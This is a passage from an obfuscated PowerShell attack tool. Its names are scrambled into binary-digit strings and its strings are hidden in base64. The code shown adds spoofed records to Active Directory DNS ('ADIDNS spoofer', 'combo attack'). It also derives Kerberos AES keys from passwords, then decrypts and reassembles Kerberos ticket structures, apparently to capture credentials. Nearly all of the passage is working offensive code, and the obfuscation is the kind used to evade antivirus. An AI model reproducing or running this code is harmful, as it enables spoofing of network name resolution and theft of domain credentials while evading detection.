                ${00001101000010001} += ${_01001100010001111}.Length + 2
                ${00001101000010001} += (${_01001100010001111}.Split(".")).Count
                ${00001101000010001} += _01001101101110101 ${_01001100010001111}
                ${00001101000010001} += 0x00
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
            {
                [Byte[]]${10101100011011110} = 0x10,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 1))[0..1]
                [Byte[]]${00001101000010001} = ${_01001100010001111}.Length
                ${00001101000010001} += [System.Text.Encoding]::UTF8.GetBytes(${_01001100010001111})
            }
        }
        [Byte[]]${00111010100101000} = [System.BitConverter]::GetBytes(${_00010010110111100})
        [Byte[]]${01100010010100001} = ${01111111101111100} +
            ${10101100011011110} +
            0x05,0xF0,0x00,0x00 +
            ${10110001011001010}[0..3] +
            ${00111010100101000}[3..0] +
            0x00,0x00,0x00,0x00
        if(${_10010010010111111})
        {
            ${01100010010100001} += 0x00,0x00,0x00,0x00
        }
        else
        {
            ${01100010100010100} = [Int64](([Datetime]::UtcNow)-(Get-Date $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAvADEALwAxADYAMAAxAA=='))))).TotalHours
            ${01100010100010100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01100010100010100}))
            ${01100010100010100} = ${01100010100010100}.Split("-") | %{[System.Convert]::ToInt16($_,16)}
            ${01100010100010100} = ${01100010100010100}[0..3]
            ${01100010010100001} += ${01100010100010100}
        }
        ${01100010010100001} += ${00001101000010001}
        return ,${01100010010100001}
    }
    function _10010001100110110
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_01001100010001111},
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$false)][String]${_01000000000001011},
            [parameter(Mandatory=$true)][String]${_10000011100010111},
            [parameter(Mandatory=$false)][String]${_00001011001101001},
            [parameter(Mandatory=$false)][String]${_10110011101001001},
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][Int]${_00010010110111100},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110}
        )
        try
        {
            ${00000110001001011} = _10110111010110110 -_10011000001001110 ${_10011000001001110} -_01001100010001111 ${_01001100010001111} -_01011011111110110 ${_01011011111110110} -_10100000011110001 ${_10100000011110001} -_01000000000001011 ${_01000000000001011} -_10000011100010111 ${_10000011100010111} -_00001011001101001 ${_00001011001101001} -_10110011101001001 ${_10110011101001001} -_00010010110111100 ${_00010010110111100} -_01111111110001111 ${_01111111110001111}
            if(${00101000010000101}.ADIDNS -and !${00000110001001011})
            {
                ${01011101100001110} = _01111110110011010 -_10011000001001110 ${_10011000001001110} -_01011011111110110 ${_01011011111110110} -_10100000011110001 ${_10100000011110001} -_10000011100010111 ${_10000011100010111} -_00001011001101001 ${_00001011001101001} -_01111111110001111 ${_01111111110001111}
                if(${01011101100001110})
                {
                    _10100011110010101 -_10011000001001110 ${_10011000001001110} -_01001100010001111 ${_01001100010001111} -_01011011111110110 ${_01011011111110110} -_10100000011110001 ${_10100000011110001} -_10000011100010111 ${_10000011100010111} -_00001011001101001 ${_00001011001101001} -_10110011101001001 ${_10110011101001001} -_00010010110111100 ${_00010010110111100} -_01111111110001111 ${_01111111110001111}
                }
            }
        }
        catch
        {
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error") > $null
            ${00101000010000101}.ADIDNS = $null
        }
    }
    function _10100110010011001
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][Array]${_10111110111011000},
            [parameter(Mandatory=$false)][String]${_01001100010001111},
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$false)][String]${_01000000000001011},
            [parameter(Mandatory=$false)]${_00001011001101001},
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][Int]${_01001111001110101},
            [parameter(Mandatory=$false)][Int]${_00010010110111100},
            [parameter(Mandatory=$false)]${_10011000000101110},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110}
        )
        sleep -S 1
        foreach(${10101100010001110} in ${_10011000000101110}.Keys)
        {
            if((${_10011000000101110}.${10101100010001110} | sort -Unique).Count -gt ${_01001111001110101})
            {
                if(!${00101000010000101}.ADIDNS_table.ContainsKey(${10101100010001110}))
                {
                    ${00101000010000101}.ADIDNS_table.Add(${10101100010001110},"")
                }
                if(${_10111110111011000} -NotContains ${10101100010001110} -and !${00101000010000101}.ADIDNS_table.${10101100010001110})
                {    
                    _10010001100110110 -_10011000001001110 ${_10011000001001110} -_01001100010001111 ${_01001100010001111} -_01011011111110110 ${_01011011111110110} -_10100000011110001 ${_10100000011110001} -_01000000000001011 ${_01000000000001011} -_10000011100010111 ${10101100010001110} -_00001011001101001 ${_00001011001101001} -_10110011101001001 'A' -_00010010110111100 ${_00010010110111100} -_01111111110001111 ${_01111111110001111}
                }
                elseif(${_10111110111011000} -Contains ${10101100010001110})
                {
                    if(!${00101000010000101}.ADIDNS_table.${10101100010001110})
                    {
                        ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS combo attack ignored ${10101100010001110}") > $null
                        ${00101000010000101}.ADIDNS_table.${10101100010001110} = 3
                    }
                }
            }
            sleep -m 10
        }
    }
}
${01011000110000000} = 
{
    function _01000110110111100
    {
        param([String]${_10110100000011111},[System.Security.SecureString]${_01011111001001101})
        ${00100110100100011} = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(${_01011111001001101})
        ${10010000111010000} = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${00100110100100011})
        [Byte[]]${_10110100000011111} = [System.Text.Encoding]::UTF8.GetBytes(${_10110100000011111})
        [Byte[]]${10010000111010000} = [System.Text.Encoding]::UTF8.GetBytes(${10010000111010000})
        ${00100000000011100} = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
        ${01011111110001110} = New-Object Security.Cryptography.Rfc2898DeriveBytes(${10010000111010000},${_10110100000011111},4096)
        rv password_cleartext
        ${00010011000010100} = ${01011111110001110}.GetBytes(32)
        ${10000000000010101} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEEAZQBzAE0AYQBuAGEAZwBlAGQA')))
        ${10000000000010101}.Mode = [System.Security.Cryptography.CipherMode]::CBC
        ${10000000000010101}.Padding = [System.Security.Cryptography.PaddingMode]::None
        ${10000000000010101}.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        ${10000000000010101}.KeySize = 256
        ${10000000000010101}.Key = ${00010011000010100}
        ${00100000011100001} = ${10000000000010101}.CreateEncryptor()
        ${00010000010101111} = ${00100000011100001}.TransformFinalBlock(${00100000000011100},0,${00100000000011100}.Length)
        ${00000100100100101} = ${00100000011100001}.TransformFinalBlock(${00010000010101111},0,${00010000010101111}.Length)
        ${_01010011010110010} = ${00010000010101111}[0..15] + ${00000100100100101}[0..15]
        return ${_01010011010110010}
    }
    function _00011111010001101
    {
        param([String]${_01110100111100010},[Int]${_00111101110011110},[Byte[]]${_01010011010110010})
        ${00000100101101000} = 0x00 * 16
        if(${_01110100111100010} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBoAGUAYwBrAHMAdQBtAA=='))))
        {
            switch(${_00111101110011110}) 
            {
                25 {[Byte[]]${01011101011000011} = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + ${00000100101101000}}
            }
        }
        elseif(${_01110100111100010} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBuAGMAcgB5AHAAdAA='))))
        {
            switch(${_00111101110011110}) 
            {
                1 {[Byte[]]${01011101011000011} = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + ${00000100101101000}}
                2 {[Byte[]]${01011101011000011} = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + ${00000100101101000}}
                3 {[Byte[]]${01011101011000011} = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + ${00000100101101000}}
                4 {[Byte[]]${01011101011000011} = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + ${00000100101101000}}
                7 {[Byte[]]${01011101011000011} = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + ${00000100101101000}}
                11 {[Byte[]]${01011101011000011} = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + ${00000100101101000}}
                12 {[Byte[]]${01011101011000011} = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + ${00000100101101000}}
                14 {[Byte[]]${01011101011000011} = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + ${00000100101101000}}
            }
        }
        elseif(${_01110100111100010} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHQAZQBnAHIAaQB0AHkA')))) 
        {
            switch(${_00111101110011110}) 
            {
                1 {[Byte[]]${01011101011000011} = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + ${00000100101101000}}
                4 {[Byte[]]${01011101011000011} = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + ${00000100101101000}}
                7 {[Byte[]]${01011101011000011} = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + ${00000100101101000}}
                11 {[Byte[]]${01011101011000011} = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + ${00000100101101000}}
            }
        }
        ${10000000000010101} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEEAZQBzAE0AYQBuAGEAZwBlAGQA')))
        ${10000000000010101}.Mode = [System.Security.Cryptography.CipherMode]::CBC
        ${10000000000010101}.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        ${10000000000010101}.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        ${10000000000010101}.KeySize = 256
        ${10000000000010101}.Key = ${_01010011010110010}
        ${00100000011100001} = ${10000000000010101}.CreateEncryptor()
        ${01100110000001010} = ${00100000011100001}.TransformFinalBlock(${01011101011000011},0,${01011101011000011}.Length)
        return ${01100110000001010}
    }
    function _10100011010111110
    {
        param ([Byte[]]${_00010101001111001})
        ${01100001111100111} = 0
        while (${_00010101001111001}[${01100001111100111}] -ne 3 -and ${_00010101001111001}[${01100001111100111}] -ne 129 -and ${_00010101001111001}[${01100001111100111}] -ne 130 -and ${_00010101001111001}[${01100001111100111}] -ne 131 -and ${_00010101001111001}[${01100001111100111}] -ne 132 -and ${01100001111100111} -lt 1)
        {
            ${01100001111100111}++   
        }
        switch (${_00010101001111001}[${01100001111100111}]) 
        {
            3
            { 
                ${01100001111100111} += 3 
                ${_00011001011000011} = ${_00010101001111001}[${01100001111100111}]
                ${01100001111100111}++
            }
            129
            {
                ${01100001111100111} += 1
                ${_00011001011000011} = ${_00010101001111001}[${01100001111100111}]
                ${01100001111100111}++
            }
            130
            {
                ${01100001111100111} += 2
                ${_00011001011000011} = _01111000101011100 0 ${_00010101001111001}[(${01100001111100111})..(${01100001111100111} - 1)]
                ${01100001111100111}++
            }
            131
            {
                ${01100001111100111} += 3
                ${_00011001011000011} = _01000101000111111 0 (${_00010101001111001}[(${01100001111100111})..(${01100001111100111} - 2)] + 0x00)
                ${01100001111100111}++
            }
            132
            {
                ${01100001111100111} += 4
                ${_00011001011000011} = _01000101000111111 0 ${_00010101001111001}[(${01100001111100111})..(${01100001111100111} - 3)]
                ${01100001111100111}++
            }
        }
        return ${01100001111100111},${_00011001011000011}
    }
    function _01010010011111001
    {
        param([Byte[]]${_00101001011100001},[Byte[]]${_10110100111101000})
        ${00110110100011011} = [Math]::Truncate(${_10110100111101000}.Count % 16)
        [Byte[]]${00010101000101100} = ${_10110100111101000}[(${_10110100111101000}.Count - ${00110110100011011})..${_10110100111101000}.Count]
        [Byte[]]${01011100010101101} = ${_10110100111101000}[(${_10110100111101000}.Count - ${00110110100011011} - 16)..(${_10110100111101000}.Count - ${00110110100011011} - 1)]
        ${10000000000010101} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEEAZQBzAE0AYQBuAGEAZwBlAGQA')))
        ${10000000000010101}.Mode = [System.Security.Cryptography.CipherMode]::CBC
        ${10000000000010101}.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        ${10000000000010101}.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        ${10000000000010101}.KeySize = 256
        ${10000000000010101}.Key = ${_00101001011100001}
        ${00000011101000011} = ${10000000000010101}.CreateDecryptor()
        ${00110101111010010} = ${00000011101000011}.TransformFinalBlock(${01011100010101101},0,${01011100010101101}.Length)
        [Byte[]]${10100000001010001} = ${00110101111010010}[${00110110100011011}..${00110101111010010}.Count]
        ${00010101000101100} += ${10100000001010001}
        [Byte[]]${10110110110010110} = ${_10110100111101000}[0..(${_10110100111101000}.Count - ${00110110100011011} - 17)] + ${00010101000101100} + ${01011100010101101}
        [Byte[]]$cleartext = ${00000011101000011}.TransformFinalBlock(${10110110110010110},0,${10110110110010110}.Length)
        return $cleartext
    }
    function _01100111000100101
    {
        param([Byte[]]${_01110101001011000},[Byte[]]${_10101000100100000})
        [Byte[]]${10110100000000111} = ${_01110101001011000} + ${_10101000100100000}
        ${10110100000000111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        ${10110100000000111} = 0x76,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        return ${10110100000000111}
    }
    function _10000101101100001
    {
        param([Byte[]]$cleartext)
        ${_00010101001111001} = _10100011010111110 $cleartext[4..9]
        ${10111010000101110} = ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + 4)..(${10111010000101110} + 9)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${00111110011011010} = $cleartext[(${10111010000101110} + 7)]
        ${00110001011110110} = $cleartext[(${10111010000101110} + ${00111110011011010} + 22)]
        ${00100001101110000} = ${00111110011011010} + ${00110001011110110}
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${00100100001011100} = $cleartext[(${10111010000101110} + ${00100001101110000} + 73)]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 74)..(${10111010000101110} + ${00100001101110000} + 79)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${10011101011101001} = $cleartext[(${10111010000101110} + ${00100001101110000} + 73)]
        ${10010110111001110} = $cleartext[(${10111010000101110} + ${00100001101110000} + 75)]
        [Byte[]]${01101111000011111} = $cleartext[(${10111010000101110} + ${00100001101110000} + 76)..(${10111010000101110} + ${00100001101110000} + ${10010110111001110} + 75)]
        ${00100001101110000} += ${10010110111001110}
        ${10011000110000111} = $cleartext[(${10111010000101110} + ${00100001101110000} + 88)]
        [Byte[]]${00101110101111000} = $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + ${10011000110000111} + 88)]
        ${00100001101110000} += ${10011000110000111}
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + 94)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + 94)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + 94)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + 94)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${00100000100001000} = $cleartext[(${10111010000101110} + ${00100001101110000} + 88)]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + 94)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + 94)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${01101110101010000} = ${_00010101001111001}[1]
        [Byte[]]${10010100101000001} = $cleartext[(${10111010000101110} + ${00100001101110000} + 89)..(${10111010000101110} + ${00100001101110000} + ${01101110101010000} + 88)]
        [Byte[]]${10110100000000111} = 0x04,0x82 + [System.BitConverter]::GetBytes(${10010100101000001}.Count)[1..0] + ${10010100101000001}
        ${10110100000000111} = 0xA2,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        ${10110100000000111} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + ${00100000100001000} + ${10110100000000111}
        ${10110100000000111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        ${10110100000000111} = 0xA3,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        [Byte[]]${_01110101001011000} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00101110101111000}.Count)[3..0] + ${00101110101111000}
        ${_01110101001011000} = 0xA1,0x84 + [System.BitConverter]::GetBytes(${_01110101001011000}.Count)[3..0] + ${_01110101001011000}
        ${_01110101001011000} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + ${_01110101001011000}
        ${_01110101001011000} = 0x30,0x84 + [System.BitConverter]::GetBytes(${_01110101001011000}.Count)[3..0] + ${_01110101001011000}
        ${_01110101001011000} = 0xA2,0x84 + [System.BitConverter]::GetBytes(${_01110101001011000}.Count)[3..0] + ${_01110101001011000}
        [Byte[]]${_10101000100100000} = 0xA1,0x84 + [System.BitConverter]::GetBytes(${01101111000011111}.Count)[3..0] + ${01101111000011111}
        ${_10101000100100000} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + ${10011101011101001} + ${_10101000100100000}
        [Byte[]]${00110000010110111} = ${_10101000100100000} + ${_01110101001011000} + ${10110100000000111}
        ${00110000010110111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0x61,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0xA2,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + ${00110000010110111}
        ${00110000010110111} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + ${00100100001011100} + ${00110000010110111}
        return ${00110000010110111}
    }
    function _10011101101010111
    {
        param([Byte[]]$cleartext)
        ${_00010101001111001} = _10100011010111110 $cleartext[0..(${10111010000101110} + 5)]
        ${10111010000101110} = ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[${10111010000101110}..(${10111010000101110} + 5)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[${10111010000101110}..(${10111010000101110} + 5)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[${10111010000101110}..(${10111010000101110} + 5)]
        ${10111010000101110} += ${_00010101001111001}[0]
        ${_00010101001111001} = _10100011010111110 $cleartext[${10111010000101110}..(${10111010000101110} + 5)]
        ${10111010000101110} += ${_00010101001111001}[0]
        [Byte[]]${00101011000000011} = $cleartext[(${10111010000101110} + 11)..(${10111010000101110} + 44)]
        ${00111101101001101} = $cleartext[(${10111010000101110} + 46)]
        [Byte[]]${10011011001110100} = $cleartext[(${10111010000101110} + 47)..(${10111010000101110} + ${00111101101001101} + 46)]
        ${10000001010100011} = $cleartext[(${10111010000101110} + ${00111101101001101} + 59)]
        ${00100001101110000} = ${00111101101001101} + ${10000001010100011}
        [Byte[]]${00110000010010101} = $cleartext[(${10111010000101110} + ${00111101101001101} + 60)..(${10111010000101110} + ${00100001101110000} + 59)]
        [Byte[]]${00000111101010100} = $cleartext[(${10111010000101110} + ${00100001101110000} + 65)..(${10111010000101110} + ${00100001101110000} + 68)]
        [Byte[]]${10110011001000001} = $cleartext[(${10111010000101110} + ${00100001101110000} + 71)..(${10111010000101110} + ${00100001101110000} + 87)]
        [Byte[]]${10101101010111111} = $cleartext[(${10111010000101110} + ${00100001101110000} + 90)..(${10111010000101110} + ${00100001101110000} + 106)]
        [Byte[]]${10011000101100000} = $cleartext[(${10111010000101110} + ${00100001101110000} + 109)..(${10111010000101110} + ${00100001101110000} + 125)]
        ${00101111100011000} = $cleartext[(${10111010000101110} + ${00100001101110000} + 127)]
        [Byte[]]${00100100000110001} = $cleartext[(${10111010000101110} + ${00100001101110000} + 128)..(${10111010000101110} + ${00100001101110000} + ${00101111100011000} + 127)]
        ${00100001101110000} += ${00101111100011000}
        ${10011000110000111} = $cleartext[(${10111010000101110} + ${00100001101110000} + 140)]
        [Byte[]]${00101110101111000} = $cleartext[(${10111010000101110} + ${00100001101110000} + 141)..(${10111010000101110} + ${00100001101110000} + ${10011000110000111} + 140)]
        [Byte[]]${10110100000000111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00101110101111000}.Count)[3..0] + ${00101110101111000}
        ${10110100000000111} = 0xA1,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        ${10110100000000111} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + ${10110100000000111}
        ${10110100000000111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        ${10110100000000111} = 0xA9,0x84 + [System.BitConverter]::GetBytes(${10110100000000111}.Count)[3..0] + ${10110100000000111}
        ${10110100000000111} = 0xA8,0x84 + [System.BitConverter]::GetBytes(${00100100000110001}.Count)[3..0] + ${00100100000110001} + ${10110100000000111}
        ${10110100000000111} = 0xA7,0x84 + [System.BitConverter]::GetBytes(${10011000101100000}.Count)[3..0] + ${10011000101100000} + ${10110100000000111}
        ${10110100000000111} = 0xA6,0x84 + [System.BitConverter]::GetBytes(${10101101010111111}.Count)[3..0] + ${10101101010111111} + ${10110100000000111}
        ${10110100000000111} = 0xA5,0x84 + [System.BitConverter]::GetBytes(${10110011001000001}.Count)[3..0] + ${10110011001000001} + ${10110100000000111}
        ${10110100000000111} = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + ${00000111101010100} + ${10110100000000111}
        [Byte[]]${_01110101001011000} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010010101}.Count)[3..0] + ${00110000010010101}
        ${_01110101001011000} = 0xA1,0x84 + [System.BitConverter]::GetBytes(${_01110101001011000}.Count)[3..0] + ${_01110101001011000}
        ${_01110101001011000} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + ${_01110101001011000}
        ${_01110101001011000} = 0x30,0x84 + [System.BitConverter]::GetBytes(${_01110101001011000}.Count)[3..0] + ${_01110101001011000}
        ${_01110101001011000} = 0xA2,0x84 + [System.BitConverter]::GetBytes(${_01110101001011000}.Count)[3..0] + ${_01110101001011000}
        ${_01110101001011000} = 0xA1,0x84 + [System.BitConverter]::GetBytes(${10011011001110100}.Count)[3..0] + ${10011011001110100} + ${_01110101001011000}
        [Byte[]]${_10101000100100000} = 0xA1,0x84 + [System.BitConverter]::GetBytes(${00101011000000011}.Count)[3..0] + ${00101011000000011}
        ${_10101000100100000} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + ${_10101000100100000}
        ${_10101000100100000} = 0x30,0x84 + [System.BitConverter]::GetBytes(${_10101000100100000}.Count)[3..0] + ${_10101000100100000}
        ${_10101000100100000} = 0xA0,0x84 + [System.BitConverter]::GetBytes(${_10101000100100000}.Count)[3..0] + ${_10101000100100000}
        [Byte[]]${00110000010110111} = ${_10101000100100000} + ${_01110101001011000} + ${10110100000000111}
        ${00110000010110111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0xA0,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0x7D,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0x04,0x82 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[1..0] + ${00110000010110111}
        ${00110000010110111} = 0xA2,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.Count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + ${00110000010110111}
        ${00110000010110111} = 0x30,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.count)[3..0] + ${00110000010110111}
        ${00110000010110111} = 0xA3,0x84 + [System.BitConverter]::GetBytes(${00110000010110111}.count)[3..0] + ${00110000010110111}
        return ${00110000010110111}
    }
    function _00111110011100111
    {
